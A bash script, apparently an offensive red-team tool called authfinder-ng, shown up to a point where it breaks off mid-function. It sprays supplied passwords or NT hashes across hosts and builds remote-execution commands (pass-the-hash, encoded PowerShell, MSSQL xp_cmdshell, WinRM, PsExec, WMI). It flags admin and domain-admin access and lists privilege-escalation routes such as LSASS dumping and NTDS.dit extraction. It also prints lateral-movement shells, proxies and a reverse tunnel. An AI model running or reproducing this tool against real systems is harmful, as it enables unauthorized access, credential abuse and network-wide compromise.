#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  authfinder-ng v3.1 — Advanced Multi-Protocol Access Discovery Engine    ║
# ║  Red Team | Penetration Testing | @Mahdiesta                             ║
# ╚══════════════════════════════════════════════════════════════════════════╝

VERSION="3.2"

# ── Colors ────────────────────────────────────────────────────────────────
# IMPORTANT: Must use $'...' so bash stores actual ESC bytes, not literal \033
# This is what makes colors render in echo, printf, cat<<EOF, and heredocs.
RED=$'\033[0;31m';   GREEN=$'\033[0;32m';  YELLOW=$'\033[1;33m'; BLUE=$'\033[0;34m'
CYAN=$'\033[0;36m';  MAG=$'\033[0;35m';   ORANGE=$'\033[38;5;208m'; BOLD=$'\033[1m'
DIM=$'\033[2m';      NC=$'\033[0m';        BRED=$'\033[1;31m';   BGRN=$'\033[1;32m'

OK="${BGRN}[+]${NC}"; FAIL="${BRED}[-]${NC}"; WARN="${YELLOW}[!]${NC}"
INFO="${BLUE}[*]${NC}"; TIP="${CYAN}[TIP]${NC}"; CMD="${ORANGE}[CMD]${NC}"
DBG="${DIM}[DBG]${NC}"; AUTH="${YELLOW}[AUTH]${NC}"

# ── RDP binary detection (xfreerdp3 on modern Kali, xfreerdp on older) ───
if command -v xfreerdp3 &>/dev/null; then
    XFREERDP_CMD="xfreerdp3"; XFREERDP_CERT="/cert:ignore"
elif command -v xfreerdp &>/dev/null; then
    XFREERDP_CMD="xfreerdp";  XFREERDP_CERT="/cert-ignore"
else
    XFREERDP_CMD="xfreerdp";  XFREERDP_CERT="/cert:ignore"
fi

# ── Globals ───────────────────────────────────────────────────────────────
MAX_THREADS=10
EXEC_TIMEOUT=20
WINRM_TIMEOUT=30
RDP_TIMEOUT=45
VERBOSE=false
RUN_ALL=false
SKIP_PORTSCAN=false
TOOLS_SPECIFIED=false
LINUX_MODE=false
LOCAL_AUTH=false
SHOW_NEXT_STEPS=true
REPORT_FILE=""
DOMAIN=""
SPRAY_DELAY=0
LOCKOUT_THRESHOLD=3
ONLY_CHECK_TOOLS=false

IMPACKET_PREFIX="impacket-"
NXC_CMD="nxc"
WINRM_CMD="evil-winrm"

VALID_TOOLS=(winrm smbexec wmi ssh mssql psexec atexec rdp)

TMP_DIR=""
RESULTS_FILE=""
AUTH_FILE=""
FAIL_FILE=""
LOCK_FILE=""

# ═══════════════════════════════════════════════════════════════════════════
# THREAD-SAFE I/O
# ═══════════════════════════════════════════════════════════════════════════
lprint() {
    if [[ -n "$LOCK_FILE" && -f "$LOCK_FILE" ]]; then
        ( flock -x 200; echo -e "$*" ) 200>"$LOCK_FILE"
    else
        echo -e "$*"
    fi
}

print_ok()   { lprint "${OK} $*"; }
print_fail() { lprint "${FAIL} $*"; }
print_warn() { lprint "${WARN} ${YELLOW}$*${NC}"; }
print_info() { lprint "${INFO} $*"; }
print_tip()  { lprint "    ${TIP} ${CYAN}$*${NC}"; }
print_cmd()  { lprint "    ${CMD} ${ORANGE}$*${NC}"; }
print_dbg()  { $VERBOSE && lprint "${DBG} ${DIM}$*${NC}" || true; }
print_sep()  { lprint "${DIM}────────────────────────────────────────────────────────────${NC}"; }
print_auth() { lprint "${AUTH} ${YELLOW}$*${NC}"; }
print_note() { lprint "    ${DIM}  ↳ $*${NC}"; }
print_req()  { lprint "    ${CYAN}[REQ]${NC} ${DIM}$*${NC}"; }

# ═══════════════════════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════════════════════
banner() {
    echo -e "${BOLD}${CYAN}"
    cat << 'BANNER'
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║   ▄▀█ █░█ ▀█▀ █░█ █▀▀ █ █▄░█ █▀▄ █▀▀ █▀█   █▄░█ █▀▀  v3.1            ║
  ║   █▀█ █▄█ ░█░ █▀█ █▀░ █ █░▀█ █▄▀ ██▄ █▀▄   █░▀█ █▄█                  ║
  ║                                                                          ║
  ║   Multi-Protocol Access Discovery & Command Execution Engine             ║
  ║   WinRM · SMBexec · WMI · PsExec · ATExec · MSSQL · RDP · SSH          ║
  ╚═══════════════════════════════════════════════════════════════════════════╝
BANNER
    echo -e "${NC}"
}

# ═══════════════════════════════════════════════════════════════════════════
# TOOL MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════
tool_exists() { command -v "$1" &>/dev/null; }

impacket_cmd() {
    [[ -n "$IMPACKET_PREFIX" ]] && echo "impacket-${1}" || echo "${1}.py"
}

install_tools() {
    echo -e "${BOLD}${CYAN}[*] Installing authfinder-ng dependencies...${NC}"
    if ! tool_exists nxc && ! tool_exists netexec; then
        echo -e "${INFO} Installing NetExec..."
        tool_exists pipx && pipx install "git+https://github.com/Pennyw0rth/NetExec" \
            || pip3 install "git+https://github.com/Pennyw0rth/NetExec"
    fi
    if ! tool_exists impacket-psexec && ! tool_exists psexec.py; then
        echo -e "${INFO} Installing Impacket..."
        tool_exists pipx && pipx install impacket || pip3 install impacket
    fi
    if ! tool_exists evil-winrm; then
        echo -e "${INFO} Installing evil-winrm..."
        gem install evil-winrm
    fi
    for pkg in smbclient ldap-utils xfreerdp2-x11; do
        apt-get install -y "$pkg" 2>/dev/null || true
    done
    echo -e "${OK} Done. Re-run authfinder-ng."
    exit 0
}

verify_tools() {
    echo -e "${BOLD}${BLUE}── Tool Verification ──────────────────────────────────────────────${NC}"
    local -a missing=()

    if tool_exists nxc;            then NXC_CMD="nxc";          lprint "${OK} netexec (nxc)     : ${GREEN}OK${NC}"
    elif tool_exists netexec;      then NXC_CMD="netexec";      lprint "${OK} netexec           : ${GREEN}OK${NC}"
    elif tool_exists crackmapexec; then NXC_CMD="crackmapexec"; lprint "${WARN} crackmapexec    : ${YELLOW}found (upgrade → netexec)${NC}"
    else lprint "${FAIL} netexec/nxc       : ${RED}NOT FOUND${NC}"; print_tip "pipx install git+https://github.com/Pennyw0rth/NetExec"; missing+=(nxc); fi

    if tool_exists impacket-psexec;   then IMPACKET_PREFIX="impacket-"; lprint "${OK} impacket          : ${GREEN}OK (impacket- prefix)${NC}"
    elif tool_exists psexec.py;        then IMPACKET_PREFIX="";          lprint "${OK} impacket          : ${GREEN}OK (.py suffix)${NC}"
    else lprint "${FAIL} impacket          : ${RED}NOT FOUND${NC}"; print_tip "pipx install impacket"; [[ "$LINUX_MODE" == "false" ]] && missing+=(impacket); fi

    local found_winrm=false
    if tool_exists evil-winrm; then
        WINRM_CMD="evil-winrm"; found_winrm=true
    elif [[ -d /usr/local/rvm/gems ]]; then
        for d in /usr/local/rvm/gems/*@evil-winrm/wrappers; do
            [[ -f "$d/evil-winrm" ]] && WINRM_CMD="$d/evil-winrm" && found_winrm=true && break
        done
    fi
    if $found_winrm; then lprint "${OK} evil-winrm        : ${GREEN}OK${NC}"
    else lprint "${FAIL} evil-winrm        : ${RED}NOT FOUND${NC}"; print_tip "gem install evil-winrm"; [[ "$LINUX_MODE" == "false" ]] && missing+=(evil-winrm); fi

    for opt in smbclient ldapsearch certipy-ad; do
        if tool_exists "$opt"; then lprint "${OK} ${opt}$(printf '%*s' $((18-${#opt})) '')  : ${GREEN}OK${NC} ${DIM}(optional)${NC}"
        else                        lprint "   ${DIM}${opt}$(printf '%*s' $((18-${#opt})) '')  : not found (optional)${NC}"; fi
    done
    # xfreerdp / xfreerdp3
    if tool_exists xfreerdp3; then
        lprint "${OK} xfreerdp3         : ${GREEN}OK${NC} ${DIM}(optional)${NC}"
        XFREERDP_CMD="xfreerdp3"; XFREERDP_CERT="/cert:ignore"
    elif tool_exists xfreerdp; then
        lprint "${OK} xfreerdp          : ${GREEN}OK${NC} ${DIM}(optional)${NC}"
        XFREERDP_CMD="xfreerdp"; XFREERDP_CERT="/cert-ignore"
    else
        lprint "   ${DIM}xfreerdp/xfreerdp3 : not found (optional)${NC}"
        print_tip "apt install freerdp2-x11  or  apt install freerdp3-x11"
    fi
    echo ""

    if [[ " ${missing[*]} " =~ " nxc " ]]; then
        echo -e "${RED}[!] netexec required. Run: authfinder-ng --install-tools${NC}"; exit 1; fi
}

# ═══════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════
is_nthash() {
    local c="${1#:}"; c="${c//\'/}"; c="${c// /}"
    [[ ${#c} -eq 32 ]] && [[ "$c" =~ ^[0-9a-fA-F]+$ ]]
}

encode_ps()  { echo -n "$1" | iconv -t UTF-16LE 2>/dev/null | base64 -w 0; }
encode_b64() { echo -n "$1" | base64 -w 0; }

parse_ip_range() {
    local range="$1"
    if [[ "$range" == *.txt && -f "$range" ]]; then
        while IFS= read -r line; do
            line="${line%%#*}"; line="${line// /}"
            [[ -z "$line" ]] && continue
            parse_ip_range "$line"
        done < "$range"
        return
    fi
    if [[ "$range" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
        python3 -c "import ipaddress
for ip in ipaddress.ip_network('$range',strict=False).hosts(): print(ip)" 2>/dev/null
        return
    fi
    IFS='.' read -ra parts <<< "$range"
    if [[ ${#parts[@]} -ne 4 ]]; then echo "$range"; return; fi
    expand_octet() {
        local -a v=()
        IFS=',' read -ra secs <<< "$1"
        for s in "${secs[@]}"; do
            if [[ "$s" =~ ^([0-9]+)-([0-9]+)$ ]]; then
                for ((i=${BASH_REMATCH[1]}; i<=${BASH_REMATCH[2]}; i++)); do v+=("$i"); done
            else v+=("$s"); fi
        done; echo "${v[@]}"
    }
    read -ra A < <(expand_octet "${parts[0]}")
    read -ra B < <(expand_octet "${parts[1]}")
    read -ra C < <(expand_octet "${parts[2]}")
    read -ra D < <(expand_octet "${parts[3]}")
    for a in "${A[@]}"; do for b in "${B[@]}"; do
        for c in "${C[@]}"; do for d in "${D[@]}"; do
            echo "$a.$b.$c.$d"
        done; done
    done; done
}

load_creds_file() {
    local path="$1"
    local -a lines=()
    while IFS= read -r line; do
        line="${line%%$'\r'}"; local s="${line// /}"
        [[ -z "$s" || "$s" == \#* ]] && continue
        lines+=("$line")
    done < "$path"
    if (( ${#lines[@]} % 2 != 0 )); then
        echo -e "${RED}[!] Odd line count in cred file. Need user/cred pairs.${NC}" >&2; exit 1; fi
    for ((i=0; i<${#lines[@]}; i+=2)); do
        local user="${lines[$i]// /}" cred="${lines[$((i+1))]}" flag=0
        is_nthash "$cred" && flag=1
        echo "${user}|${cred}|${flag}"
    done
}

# ═══════════════════════════════════════════════════════════════════════════
# PORT SCANNING
# ═══════════════════════════════════════════════════════════════════════════
check_port() { timeout 1 bash -c ">/dev/tcp/${1}/${2}" 2>/dev/null; }

scan_ports_for_ip() {
    local ip="$1"; shift
    local -a tlist=("$@")
    [[ ${#tlist[@]} -eq 0 ]] && tlist=("${VALID_TOOLS[@]}")
    local -a viable=()
    local ports_file="${TMP_DIR}/ports_${ip//./_}.txt"
    touch "$ports_file"

    add_viable() {
        local t="$1" port="$2"
        if check_port "$ip" "$port"; then
            viable+=("$t")
            grep -qx "$port" "$ports_file" 2>/dev/null || echo "$port" >> "$ports_file"
        fi
    }

    for tool in "${tlist[@]}"; do
        case "$tool" in
            winrm)                 add_viable winrm     5985; add_viable winrm-ssl 5986 ;;
            psexec|smbexec|atexec) add_viable "$tool"   445  ;;
            wmi)                   add_viable wmi        135  ;;
            rdp)                   add_viable rdp        3389 ;;
            mssql)                 add_viable mssql      1433 ;;
            ssh)                   add_viable ssh        22   ;;
        esac
    done

    # Always probe RDP silently for next_steps awareness
    if ! grep -qx "3389" "$ports_file" 2>/dev/null; then
        check_port "$ip" 3389 && echo "3389" >> "$ports_file"
    fi

    printf '%s\n' "${viable[@]}"
}

ip_has_port() {
    local ip="$1" port="$2"
    grep -qx "$port" "${TMP_DIR}/ports_${ip//./_}.txt" 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════════════
# COMMAND BUILDING — execution commands
# ═══════════════════════════════════════════════════════════════════════════
build_cmd() {
    local tool="$1" user="$2" ip="$3" cred="$4" use_hash="$5" command="$6" domain="${7:-}"
    local b64ps; b64ps=$(encode_ps "$command")
    local b64sh; b64sh=$(encode_b64 "$command")
    local hash_val="${cred#:}"; hash_val="${hash_val//\'/}"
    local dom_prefix="" nxc_dom=""
    [[ -n "$domain" ]] && { dom_prefix="${domain}/"; nxc_dom=" -d '${domain}'"; }
    [[ "$LOCAL_AUTH" == "true" ]] && nxc_dom=" --local-auth"

    case "$tool" in
        psexec)
            local ic; ic=$(impacket_cmd psexec)
            [[ "$use_hash" == "1" ]] \
                && echo "${ic} -hashes :${hash_val} '${dom_prefix}${user}'@${ip} 'powershell -enc ${b64ps}'" \
                || echo "${ic} '${dom_prefix}${user}':'${cred}'@${ip} 'powershell -enc ${b64ps}'" ;;
        mssql)
            local ic; ic=$(impacket_cmd mssqlclient)
            [[ "$use_hash" == "1" ]] \
                && echo "${ic} -hashes :${hash_val} '${dom_prefix}${user}'@${ip} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc ${b64ps}'" \
                || echo "${ic} '${dom_prefix}${user}':'${cred}'@${ip} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc ${b64ps}'" ;;
        atexec)
            local ic; ic=$(impacket_cmd atexec)
            [[ "$use_hash" == "1" ]] \
                && echo "${ic} -hashes :${hash_val} '${dom_prefix}${user}'@${ip} 'powershell -enc ${b64ps}'" \
                || echo "${ic} '${dom_prefix}${user}':'${cred}'@${ip} 'powershell -enc ${b64ps}'" ;;
        winrm)
            local df=""; [[ -n "$domain" ]] && df="-r '${domain}'"
            [[ "$use_hash" == "1" ]] \
                && echo "echo 'powershell -enc ${b64ps}' | ${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val} ${df}" \
                || echo "echo 'powershell -enc ${b64ps}' | ${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}' ${df}" ;;
        winrm-ssl)
            local df=""; [[ -n "$domain" ]] && df="-r '${domain}'"
            [[ "$use_hash" == "1" ]] \
                && echo "echo 'powershell -enc ${b64ps}' | ${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val} --ssl ${df}" \
                || echo "echo 'powershell -enc ${b64ps}' | ${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}' --ssl ${df}" ;;
        smbexec)
            [[ "$use_hash" == "1" ]] \
                && echo "${NXC_CMD} smb ${ip} -H ${hash_val} -u '${user}'${nxc_dom} -X 'powershell -enc ${b64ps}' --exec-method smbexec" \
                || echo "${NXC_CMD} smb ${ip} -p '${cred}' -u '${user}'${nxc_dom} -X 'powershell -enc ${b64ps}' --exec-method smbexec" ;;
        wmi)
            [[ "$use_hash" == "1" ]] \
                && echo "${NXC_CMD} wmi ${ip} -H ${hash_val} -u '${user}'${nxc_dom} -X 'cmd /c \"powershell -enc ${b64ps}\"'" \
                || echo "${NXC_CMD} wmi ${ip} -p '${cred}' -u '${user}'${nxc_dom} -X 'cmd /c \"powershell -enc ${b64ps}\"'" ;;
        ssh)
            [[ "$use_hash" == "1" ]] && { echo ""; return 1; }
            if [[ "$LINUX_MODE" == "true" ]]; then
                echo "${NXC_CMD} ssh ${ip} -p '${cred}' -u '${user}' -x 'echo ${b64sh} | base64 -d | \$0'"
            else
                echo "${NXC_CMD} ssh ${ip} -p '${cred}' -u '${user}' -x 'powershell -enc ${b64ps}'"
            fi ;;
        rdp)
            # Use screenshot mode to verify auth (exec via -X is unreliable)
            [[ "$use_hash" == "1" ]] \
                && echo "${NXC_CMD} rdp ${ip} -u '${user}' -H ${hash_val}${nxc_dom} --screenshot --screentime 3" \
                || echo "${NXC_CMD} rdp ${ip} -u '${user}' -p '${cred}'${nxc_dom} --screenshot --screentime 3" ;;
        *) echo ""; return 1 ;;
    esac
}

# Clean interactive shell command for summary/next_steps
build_shell_cmd() {
    local tool="$1" user="$2" ip="$3" cred="$4" use_hash="$5" domain="${6:-}"
    local hash_val="${cred#:}"; hash_val="${hash_val//\'/}"
    local dom_prefix="" nxc_dom=""
    [[ -n "$domain" ]] && { dom_prefix="${domain}\\"; nxc_dom=" -d '${domain}'"; }
    [[ "$LOCAL_AUTH" == "true" ]] && nxc_dom=" --local-auth"

    case "$tool" in
        winrm|winrm-ssl)
            local ssl=""; [[ "$tool" == "winrm-ssl" ]] && ssl=" --ssl"
            local df=""; [[ -n "$domain" ]] && df=" -r '${domain}'"
            [[ "$use_hash" == "1" ]] \
                && echo "${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val}${ssl}${df}" \
                || echo "${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}'${ssl}${df}" ;;
        psexec|smbexec|wmi|atexec)
            local wex; wex=$(impacket_cmd wmiexec)
            [[ "$use_hash" == "1" ]] \
                && echo "${wex} -hashes :${hash_val} '${dom_prefix}${user}'@${ip}" \
                || echo "${wex} '${dom_prefix}${user}':'${cred}'@${ip}" ;;
        rdp)
            [[ "$use_hash" == "1" ]] \
                && echo "${XFREERDP_CMD} /v:${ip} /u:'${user}' /pth:${hash_val} ${XFREERDP_CERT} /dynamic-resolution +clipboard" \
                || echo "${XFREERDP_CMD} /v:${ip} /u:'${user}' /p:'${cred}' ${XFREERDP_CERT} /dynamic-resolution +clipboard" ;;
        mssql)
            local msc; msc=$(impacket_cmd mssqlclient)
            [[ "$use_hash" == "1" ]] \
                && echo "${msc} -hashes :${hash_val} '${dom_prefix}${user}'@${ip} -windows-auth" \
                || echo "${msc} '${dom_prefix}${user}':'${cred}'@${ip} -windows-auth" ;;
        ssh) echo "ssh '${user}'@${ip}" ;;
        *) echo "" ;;
    esac
}

# ═══════════════════════════════════════════════════════════════════════════
# OUTPUT INTELLIGENCE — parse whoami/nxc output for privilege context
# ═══════════════════════════════════════════════════════════════════════════
analyze_output() {
    local out="$1" ip="$2" user="$3"
    local ctx_file="${TMP_DIR}/ctx_${ip//./_}_${user}.txt"
    local is_admin=false is_da=false is_system=false
    local -a privs=()
    local dom_name=""

    # Admin detection
    echo "$out" | grep -qi "Pwn3d!"                          && is_admin=true
    echo "$out" | grep -qi "BUILTIN\\\\Administrators"        && is_admin=true
    echo "$out" | grep -qi "S-1-5-32-544"                    && is_admin=true
    echo "$out" | grep -qi "High Mandatory Level"             && is_admin=true
    echo "$out" | grep -qi "NT AUTHORITY.SYSTEM"              && { is_admin=true; is_system=true; }

    # Domain Admin
    echo "$out" | grep -qi "Domain Admins\|Enterprise Admins\|Schema Admins" && is_da=true

    # Domain name
    dom_name=$(echo "$out" | grep -oi 'domain:[A-Za-z0-9._-]*' | head -1 | cut -d: -f2)

    # Dangerous privileges
    local priv_checks=(
        "SeImpersonatePrivilege:Token Impersonation → GodPotato/PrintSpoofer/SweetPotato"
        "SeDebugPrivilege:Debug Processes → LSASS dump / process injection"
        "SeBackupPrivilege:Read ANY file → NTDS.dit extraction"
        "SeRestorePrivilege:Write ANY file → DLL injection / service abuse"
        "SeTakeOwnershipPrivilege:Own any object → protected file/registry abuse"
        "SeLoadDriverPrivilege:Load kernel driver → EoPLoadDriver / Capcom exploit"
        "SeCreateTokenPrivilege:Create SYSTEM token → full privilege escalation"
        "SeAssignPrimaryTokenPrivilege:Assign process tokens → impersonation"
        "SeTcbPrivilege:Act as OS → complete impersonation"
        "SeEnableDelegationPrivilege:Enable delegation → Kerberos attack surface"
        "SeManageVolumePrivilege:Volume-level access → shadow copy NTDS.dit"
    )

    for entry in "${priv_checks[@]}"; do
        local priv="${entry%%:*}"
        echo "$out" | grep -qi "$priv" && privs+=("$entry")
    done

    # Persist context
    {
        echo "IS_ADMIN=${is_admin}"
        echo "IS_DA=${is_da}"
        echo "IS_SYSTEM=${is_system}"
        echo "DOMAIN=${dom_name}"
        printf 'PRIVS=%s\n' "${privs[*]}"
    } > "$ctx_file"

    # Inline privilege highlights in output stream
    if [[ ${#privs[@]} -gt 0 ]]; then
        lprint ""
        lprint "  ${BOLD}${YELLOW}⚡ DANGEROUS PRIVILEGES DETECTED:${NC}"
        for entry in "${privs[@]}"; do
            local priv="${entry%%:*}" desc="${entry#*:}"
            lprint "    ${BRED}▸ ${priv}${NC} ${DIM}→ ${desc}${NC}"
        done
    fi

    $is_admin  && lprint "  ${BGRN}${BOLD}★ LOCAL ADMIN CONFIRMED${NC}"
    $is_da     && lprint "  ${BRED}${BOLD}★★ DOMAIN ADMIN CONFIRMED — DOMAIN COMPROMISED ★★${NC}"
    $is_system && lprint "  ${BRED}${BOLD}★★ NT AUTHORITY\\SYSTEM${NC}"
}

get_ctx() {
    local ip="$1" user="$2" key="$3"
    local ctx_file="${TMP_DIR}/ctx_${ip//./_}_${user}.txt"
    [[ -f "$ctx_file" ]] && grep "^${key}=" "$ctx_file" | cut -d= -f2- || echo ""
}

# ═══════════════════════════════════════════════════════════════════════════
# ERROR ADVISOR
# ═══════════════════════════════════════════════════════════════════════════
analyze_error() {
    local tool="$1" out="$2" ip="$3" user="$4" cred="$5" use_hash="$6"

    echo "$out" | grep -qi "STATUS_LOGON_FAILURE\|Logon failure\|wrong password\|invalid credentials" && {
        lprint "    ${WARN} ${YELLOW}Wrong credentials for '${user}' on ${ip}${NC}"
        [[ "$use_hash" == "1" ]] && print_tip "Verify hash is 32 hex chars (NT only, no LM prefix)"
        print_tip "Enumerate accounts: ${NXC_CMD} smb ${ip} -u '' -p '' --users 2>/dev/null"
        return; }

    echo "$out" | grep -qi "ACCOUNT_LOCKED_OUT\|account locked" && {
        lprint "    ${FAIL} ${RED}LOCKOUT: '${user}' is LOCKED on ${ip} — STOP spraying!${NC}"
        return; }

    echo "$out" | grep -qi "ACCOUNT_DISABLED" && {
        lprint "    ${WARN} ${YELLOW}Account DISABLED: '${user}' on ${ip}${NC}"
        return; }

    echo "$out" | grep -qi "PASSWORD_EXPIRED\|PASSWORD_MUST_CHANGE" && {
        lprint "    ${WARN} ${YELLOW}Password EXPIRED for '${user}' — must change on first logon${NC}"
        print_tip "Connect interactively to trigger password change:"
        print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}'"
        return; }

    echo "$out" | grep -qi "STATUS_ACCESS_DENIED\|access denied" && {
        lprint "    ${WARN} ${YELLOW}Creds VALID but not local admin on ${ip}${NC}"
        [[ "$LOCAL_AUTH" == "false" ]] && print_tip "Try --local-auth if this is a local account"
        print_tip "Verify: ${NXC_CMD} smb ${ip} -u '${user}' -p '${cred}' 2>&1 | grep -E 'Pwn3d|\\+'"
        return; }

    echo "$out" | grep -qi "STATUS_LOGON_TYPE_NOT_GRANTED" && {
        lprint "    ${WARN} ${YELLOW}Logon type denied for ${tool} — try different protocol${NC}"
        print_tip "--tools wmi  or  --tools atexec"
        return; }

    echo "$out" | grep -qi "Clock skew\|KRB_AP_ERR_SKEW" && {
        lprint "    ${WARN} ${YELLOW}Kerberos clock skew — sync time:${NC}"
        print_cmd "sudo ntpdate ${ip} && sudo hwclock -w"
        return; }

    echo "$out" | grep -qi "KDC_ERR_C_PRINCIPAL_UNKNOWN" && {
        lprint "    ${FAIL} ${RED}Kerberos: user '${user}' not found — check username and -d DOMAIN${NC}"
        return; }

    echo "$out" | grep -qi "KDC_ERR_PREAUTH_FAILED" && {
        lprint "    ${FAIL} ${RED}Kerberos pre-auth failed — wrong password${NC}"
        return; }

    if [[ "$tool" =~ ^winrm ]]; then
        echo "$out" | grep -qi "WinRMAuthorizationError\|Unauthorized\|401" && {
            lprint "    ${WARN} ${YELLOW}WinRM: service up but auth rejected${NC}"
            print_tip "Try adding domain: -d DOMAIN"
            print_tip "Check WinRM membership: user must be in 'Remote Management Users' or Administrators"
            return; }
    fi

    echo "$out" | grep -qi "rpc_s_access_denied" && {
        lprint "    ${WARN} ${YELLOW}RPC access denied — creds valid but not local admin${NC}"
        return; }

    echo "$out" | grep -qi "signing.*required\|SMB.*signing" && {
        lprint "    ${WARN} ${YELLOW}SMB signing required on ${ip}${NC}"
        print_cmd "${NXC_CMD} smb ${ip} --gen-relay-list relay_targets.txt  ${DIM}# find non-signing targets${NC}"
        return; }

    [[ "$tool" == "mssql" ]] && echo "$out" | grep -qi "EXECUTE permission.*denied" && {
        lprint "    ${WARN} ${YELLOW}MSSQL auth OK but xp_cmdshell denied — need sysadmin role${NC}"
        print_cmd "$(impacket_cmd mssqlclient) ... -windows-auth  ${DIM}# check IS_SRVROLEMEMBER('sysadmin')${NC}"
        return; }
}

# ═══════════════════════════════════════════════════════════════════════════
# CONTEXT-AWARE NEXT STEPS
# ═══════════════════════════════════════════════════════════════════════════
next_steps() {
    local tool="$1" ip="$2" user="$3" cred="$4" use_hash="$5" domain="${6:-}"
    local hash_val="${cred#:}"; hash_val="${hash_val//\'/}"
    local dom_prefix="" nxc_dom=""
    [[ -n "$domain" ]] && { dom_prefix="${domain}\\"; nxc_dom=" -d '${domain}'"; }
    [[ "$LOCAL_AUTH" == "true" ]] && nxc_dom=" --local-auth"

    local auth_p auth_h
    if [[ "$use_hash" == "1" ]]; then
        auth_p="-hashes :${hash_val} '${dom_prefix}${user}'@${ip}"
        auth_h="-u '${user}' -H ${hash_val}${nxc_dom}"
    else
        auth_p="'${dom_prefix}${user}':'${cred}'@${ip}"
        auth_h="-u '${user}' -p '${cred}'${nxc_dom}"
    fi

    local is_admin; is_admin=$(get_ctx "$ip" "$user" "IS_ADMIN")
    local is_da;    is_da=$(get_ctx "$ip" "$user" "IS_DA")
    local is_system;is_system=$(get_ctx "$ip" "$user" "IS_SYSTEM")
    local privs;    privs=$(get_ctx "$ip" "$user" "PRIVS")
    local det_dom;  det_dom=$(get_ctx "$ip" "$user" "DOMAIN")
    [[ -z "$domain" && -n "$det_dom" ]] && domain="$det_dom"
    local rdp_open=false; ip_has_port "$ip" 3389 && rdp_open=true

    # Build generic auth args for NEXT_TARGET placeholders
    local auth_p_next auth_h_next
    if [[ "$use_hash" == "1" ]]; then
        auth_p_next="-hashes :${hash_val} '${dom_prefix}${user}'@NEXT_TARGET"
        auth_h_next="-u '${user}' -H ${hash_val}${nxc_dom}"
    else
        auth_p_next="'${dom_prefix}${user}':'${cred}'@NEXT_TARGET"
        auth_h_next="-u '${user}' -p '${cred}'${nxc_dom}"
    fi

    lprint ""
    lprint "${BOLD}${CYAN}╔══ NEXT STEPS ════════════════════════════════════════════════════╗${NC}"

    # ── [1] Interactive Shell ──────────────────────────────────────────────
    lprint "${BOLD}  [1] Interactive Shell${NC}"
    print_note "Get a shell on the target — method depends on which protocol succeeded"
    case "$tool" in
        winrm|winrm-ssl)
            local ssl=""; [[ "$tool" == "winrm-ssl" ]] && ssl=" --ssl"
            local df=""; [[ -n "$domain" ]] && df=" -r '${domain}'"
            [[ "$use_hash" == "1" ]] \
                && print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val}${ssl}${df}" \
                || print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}'${ssl}${df}" ;;
        psexec|smbexec|atexec)
            local wex sex dex; wex=$(impacket_cmd wmiexec); sex=$(impacket_cmd smbexec); dex=$(impacket_cmd dcomexec)
            print_cmd "${wex} ${auth_p}                ${DIM}# WMIexec (semi-interactive)${NC}"
            print_cmd "${sex} ${auth_p}                ${DIM}# SMBexec (stealth, less detected)${NC}"
            print_cmd "${dex} ${auth_p} 'cmd.exe'      ${DIM}# DCOM lateral movement${NC}" ;;
        wmi)
            if [[ "$is_admin" == "true" ]]; then
                local wex sex dex; wex=$(impacket_cmd wmiexec); sex=$(impacket_cmd smbexec); dex=$(impacket_cmd dcomexec)
                print_cmd "${wex} ${auth_p}            ${DIM}# interactive WMI shell${NC}"
                print_cmd "${sex} ${auth_p}            ${DIM}# SMBexec alternative (stealthier)${NC}"
                print_cmd "${dex} ${auth_p} 'cmd.exe'  ${DIM}# DCOM${NC}"
            else
                lprint "    ${YELLOW}[!] impacket-wmiexec needs local admin — not available for this user${NC}"
                lprint "    ${DIM}# Use nxc wmi for non-interactive remote commands:${NC}"
                print_cmd "${NXC_CMD} wmi ${ip} ${auth_h} -X 'whoami /all'"
                print_cmd "${NXC_CMD} wmi ${ip} ${auth_h} -X 'net user ${user} /domain'"
                print_cmd "${NXC_CMD} wmi ${ip} ${auth_h} -X 'net localgroup Administrators'"
                lprint "    ${DIM}# Try evil-winrm if WinRM port 5985/5986 is open:${NC}"
                if [[ "$use_hash" == "1" ]]; then
                    print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val}"
                else
                    print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}'"
                fi
            fi ;;
        mssql)
            print_cmd "$(impacket_cmd mssqlclient) ${auth_p} -windows-auth" ;;
        ssh)
            print_cmd "ssh '${user}'@${ip}"
            print_cmd "ssh -D 1080 -N '${user}'@${ip}           ${DIM}# SOCKS5 dynamic proxy${NC}"
            print_cmd "ssh -L 8080:127.0.0.1:80 '${user}'@${ip} ${DIM}# local port forward${NC}"
            print_cmd "ssh -R 2222:127.0.0.1:22 '${user}'@${ip} ${DIM}# reverse tunnel to attacker${NC}" ;;
        rdp)
            if [[ "$use_hash" == "1" ]]; then
                print_cmd "${XFREERDP_CMD} /v:${ip} /u:'${user}' /pth:${hash_val} ${XFREERDP_CERT} /dynamic-resolution +clipboard"
            else
                print_cmd "${XFREERDP_CMD} /v:${ip} /u:'${user}' /p:'${cred}' ${XFREERDP_CERT} /dynamic-resolution +clipboard"
            fi ;;
    esac

    # ── Always show RDP if port 3389 is open (and wasn't the primary tool) ─
    if $rdp_open && [[ "$tool" != "rdp" ]]; then
        lprint "${BOLD}  [RDP] Desktop Access ${CYAN}(port 3389 open)${NC}"
        if [[ "$use_hash" == "1" ]]; then
            print_cmd "${XFREERDP_CMD} /v:${ip} /u:'${user}' /pth:${hash_val} ${XFREERDP_CERT} /dynamic-resolution +clipboard"
        else
